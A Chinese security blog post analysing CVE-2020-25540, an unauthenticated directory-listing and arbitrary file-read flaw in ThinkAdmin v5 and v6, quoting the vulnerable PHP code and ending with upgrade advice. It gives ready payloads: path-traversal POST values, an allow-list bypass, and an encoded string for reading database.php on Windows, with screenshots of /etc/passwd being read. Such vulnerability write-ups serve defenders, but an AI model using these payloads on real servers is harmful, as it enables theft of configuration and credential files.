---
title: "ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)"
source: https://mrxn.net/jswz/360.html
---

# ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)

[Mrxn](https://mrxn.net/author/1)* 发表于2020/9/16 21:21
* 7342浏览
* [0评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

首先声明：内容来自ThinkAdmin的GitHub的官方项目的issue 由 @
Hzllaga 师傅提供
.

**0x1.漏洞简介**

ThinkAdmin是一套基于ThinkPHP框架的通用后台管理系统。ThinkAdmin v6版本存在路径遍历漏洞。攻击者可利用该
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
通过GET请求编码参数任意读取远程服务器上的文件。

**0x2.影响范围**

Thinkadmin ≤ 2020.08.03.01

**0x3.漏洞分析复现**

app/admin/controller/api/Update.php存在3个function，都是
[不用登录认证](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)
就可以使用的，引用列表如下：

namespace app\admin\controller\api;

use think\admin\Controller;

use think\admin\service\InstallService;

use think\admin\service\ModuleService;

version()可以获取到当前版本：2020.08.03.01，≤这个版本的都有可能存在漏洞

URL：http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version

**列目录**

node()：

```
/**
* 读取文件列表
*/
public function node()
{
    $this->success('获取文件列表成功！', InstallService::instance()->getList(
        json_decode($this->request->post('rules', '[]', ''), true),
        json_decode($this->request->post('ignore', '[]', ''), true)
    ));
}
```

直接把POST的rules和ignore参数传给InstallService::instance()->getList()，根据上面的use引用可以知道文件路径在vendor/zoujingli/think-library/src/service/InstallService.php：

```
/**
 * 获取文件信息列表
 * @param array $rules 文件规则
 * @param array $ignore 忽略规则
 * @param array $data 扫描结果列表
 * @return array
 */
public function getList(array $rules, array $ignore = [], array $data = []): array
{
    // 扫描规则文件
    foreach ($rules as $key => $rule) {
        $name = strtr(trim($rule, '\\/'), '\\', '/');
        $data = array_merge($data, $this->_scanList($this->root . $name));
    }
    // 清除忽略文件
    foreach ($data as $key => $item) foreach ($ignore as $ign) {
        if (stripos($item['name'], $ign) === 0) unset($data[$key]);
    }
    // 返回文件数据
    return ['rules' => $rules, 'ignore' => $ignore, 'list' => $data];
}
```

$ignore可以不用关注，他会透过\_scanList()去遍历$rules数组，调用scanDirectory()去递归遍历目录下的文件，最后在透过\_getInfo()去获取文件名与哈希，由下面代码可以知道程序没有任何验证，攻击者可以在未授权的情况下读取服务器的文件列表。

```
/**
 * 获取目录文件列表
 * @param string $path 待扫描目录
 * @param array $data 扫描结果
 * @return array
 */
private function _scanList($path, $data = []): array
{
    foreach (NodeService::instance()->scanDirectory($path, [], null) as $file) {
        $data[] = $this->_getInfo(strtr($file, '\\', '/'));
    }
    return $data;
}
```

```
/**
 * 获取所有PHP文件列表
 * @param string $path 扫描目录
 * @param array $data 额外数据
 * @param string $ext 文件后缀
 * @return array
 */
public function scanDirectory($path, $data = [], $ext = 'php')
{
    if (file_exists($path)) if (is_file($path)) $data[] = $path;
    elseif (is_dir($path)) foreach (scandir($path) as $item) if ($item[0] !== '.') {
        $realpath = rtrim($path, '\\/') . DIRECTORY_SEPARATOR . $item;
        if (is_readable($realpath)) if (is_dir($realpath)) {
            $data = $this->scanDirectory($realpath, $data, $ext);
        } elseif (is_file($realpath) && (is_null($ext) || pathinfo($realpath, 4) === $ext)) {
            $data[] = strtr($realpath, '\\', '/');
        }
    }
    return $data;
}
```

```
/**
 * 获取指定文件信息
 * @param string $path 文件路径
 * @return array
 */
private function _getInfo($path): array
{
    return [
        'name' => str_replace($this->root, '', $path),
        'hash' => md5(preg_replace('/\s+/', '', file_get_contents($path))),
    ];
}
```

读取网站根目录Payload: http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node

POST:

rules=["/"]

也可以使用../来进行目录穿越

rules=["../../../"]

演示站：

[![ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)](https://mrxn.net/content/uploadfile/202009/thum-41a21600263205.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/41a21600263205.png)

**任意文件读取**

get()：

```
/**
 * 读取文件内容
 */
public function get()
{
    $filename = decode(input('encode', '0'));
    if (!ModuleService::instance()->checkAllowDownload($filename)) {
        $this->error('下载的文件不在认证规则中！');
    }
    if (file_exists($realname = $this->app->getRootPath() . $filename)) {
        $this->success('读取文件内容成功！', [
            'content' => base64_encode(file_get_contents($realname)),
        ]);
    } else {
        $this->error('读取文件内容失败！');
    }
}
```

首先从GET读取encode参数并使用decode()解码：

```
/**
 * 解密 UTF8 字符串
 * @param string $content
 * @return string
 */
function decode($content)
{
    $chars = '';
    foreach (str_split($content, 2) as $char) {
        $chars .= chr(intval(base_convert($char, 36, 10)));
    }
    return iconv('GBK//TRANSLIT', 'UTF-8', $chars);
}
```

解密UTF8字符串的，刚好上面有个加密UTF8字符串的encode()，攻击时直接调用那个就可以了：

```
/**
 * 加密 UTF8 字符串
 * @param string $content
 * @return string
 */
function encode($content)
{
    [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))];
    for ($i = 0; $i < $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
    return $chars;
}
```

跟进ModuleService::instance()->checkAllowDownload()，文件路径vendor/zoujingli/think-library/src/service/ModuleService.php：

```
/**
 * 检查文件是否可下载
 * @param string $name 文件名称
 * @return boolean
 */
public function checkAllowDownload($name): bool
{
    // 禁止下载数据库配置文件
    if (stripos($name, 'database.php') !== false) {
        return false;
    }
    // 检查允许下载的文件规则
    foreach ($this->getAllowDownloadRule() as $rule) {
        if (stripos($name, $rule) !== false) return true;
    }
    // 不在允许下载的文件规则
    return false;
}
```

首先$name不能够是database.php，接着跟进getAllowDownloadRule()：

```
/**
 * 获取允许下载的规则
 * @return array
 */
public function getAllowDownloadRule(): array
{
    $data = $this->app->cache->get('moduleAllowRule', []);
    if (is_array($data) && count($data) > 0) return $data;
    $data = ['config', 'public/static', 'public/router.php', 'public/index.php'];
    foreach (array_keys($this->getModules()) as $name) $data[] = "app/{$name}";
    $this->app->cache->set('moduleAllowRule', $data, 30);
    return $data;
}
```

有一个允许的列表：

config

public/static

public/router.php

public/index.php

app/admin

app/wechat

也就是说$name必须要不是database.php且要在允许列表内的文件才能够被读取，先绕过安全列表的限制，比如读取根目录的1.txt，只需要传入：

public/static/../../1.txt

而database.php的限制在Linux下应该是没办法绕过的，但是在Windows下可以透过"来替换.，也就是传入：

public/static/../../config/database"php

对应encode()后的结果为：

34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34

Windows读取database.php：

[![ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)](https://mrxn.net/content/uploadfile/202009/thum-5f831600263205.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/5f831600263205.png)

演示站读取/etc/passwd：

[![ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)](https://mrxn.net/content/uploadfile/202009/thum-47171600263205.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/47171600263205.png)

v5连允许列表都没有，可以直接读任意文件。

**0x4.漏洞修复**

临时方案：

[![ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)](https://mrxn.net/content/uploadfile/202009/thum-5a311600263205.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/5a311600263205.png)

升级到最新版！

来源：
https://github.com/zoujingli/ThinkAdmin/issues/244

* 标签：
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)](https://mrxn.net/jswz/360.html)
  
文章链接：
<https://mrxn.net/jswz/360.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/360.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/360.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});